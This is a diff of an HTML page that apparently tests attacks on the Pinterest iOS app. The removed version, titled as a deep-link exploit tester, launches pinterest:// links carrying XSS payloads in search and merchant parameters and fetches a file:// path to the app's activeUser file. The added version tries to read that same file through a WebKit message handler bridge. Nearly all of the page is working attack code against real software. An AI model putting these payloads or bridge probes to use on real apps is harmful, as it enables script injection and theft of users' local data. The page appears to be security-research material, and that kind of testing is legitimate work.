@@ -1,80 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>🎯 Pinterest Deep Link Exploit Tester</title>
-  <style>
-    body {
-      font-family: sans-serif;
-      background: #f4f4f4;
-      padding: 30px;
-    }
-    h1 {
-      color: #333;
-    }
-    button {
-      display: block;
-      margin: 10px 0;
-      padding: 10px 20px;
-      font-size: 16px;
-      background-color: #e60023;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #c0001e;
-    }
-  </style>
+  <title>Test Access ActiveUser File via JS Bridge</title>
 </head>
 <body>
-
-  <h1>🎯 Pinterest Deep Link Exploit Tester</h1>
-
-  <button onclick="launchDeepLink('pinterest://search/xss%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(`PWNED`)%3E?param=1')">
-    🔍 Test XSS in Search Param
-  </button>
-
-  <button onclick="launchDeepLink('pinterest://pin/813392382758771958')">
-    📌 Open Pinterest Pin
-  </button>
-
-  <button onclick="launchDeepLink('pinterest://idea-pin-builder')">
-    🛠️ Open Idea Pin Builder
-  </button>
-
-  <button onclick="launchDeepLink('pinterest://brand_catalog/?merchant=%3Cscript%3Ealert(`PWNED`)%3C%2Fscript%3E&pin_id=123')">
-    🛍️ Inject JS in Brand Catalog (merchant param)
-  </button>
-
-  <!-- زر جديد لقراءة محتوى الملف -->
-  <button onclick="readActiveUserFile()">
-    📂 Read activeUser file content
-  </button>
+  <h1>Test ActiveUser File Access</h1>
+  <button onclick="readActiveUser()">Read activeUser File</button>
 
   <script>
-    function launchDeepLink(url) {
-      console.log("Launching deep link:", url);
-      window.location.href = url;
-    }
-
-    function readActiveUserFile() {
-      const fileUrl = 'file:///var/mobile/Containers/Data/Application/403983B1-9B7C-4405-BA97-B9581EBD7799/Documents/activeUser';
-      fetch(fileUrl)
-        .then(response => {
-          if (!response.ok) throw new Error('Network response was not ok');
-          return response.text();
-        })
-        .then(data => {
-          console.log('File content:', data);
-          alert('File content:\n' + data);
-        })
-        .catch(err => {
-          console.error('Error reading file:', err);
-          alert('Error reading file:\n' + err.message);
+    function readActiveUser() {
+      try {
+        window.webkit.messageHandlers.PinImageOffScreenDetectionHandler.postMessage({
+          url: "file:///var/mobile/Containers/Data/Application/403983B1-9B7C-4405-BA97-B9581EBD7799/Documents/activeUser"
         });
+        alert("Request sent to PinImageOffScreenDetectionHandler");
+      } catch(e) {
+        alert("Error: " + e.message);
+      }
     }
   </script>
-
 </body>
 </html>
